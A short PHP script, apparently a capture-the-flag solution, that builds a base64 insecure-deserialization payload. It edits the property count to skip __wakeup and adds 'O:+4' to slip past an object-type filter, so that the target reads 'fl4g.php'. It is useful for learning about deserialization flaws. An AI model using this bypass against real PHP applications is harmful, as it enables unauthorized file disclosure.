<?php

class Demo { 
    private $file = 'index.php';
    public function __construct($file) { 
        $this->file = $file; 
    }
    function __destruct() { 
        //echo @highlight_file($this->file, true); 
    }
    function __wakeup() { 
        if ($this->file != 'index.php') { 
            // the secret is in the fl4g.php
            $this->file = 'index.php'; 
        } 
    } 
}

$a = new Demo('fl4g.php');
$b = serialize($a);
$b = str_replace(':1:', ':2:', $b);
$b = str_replace('O:4', 'O:+4', $b);
echo base64_encode($b);
?>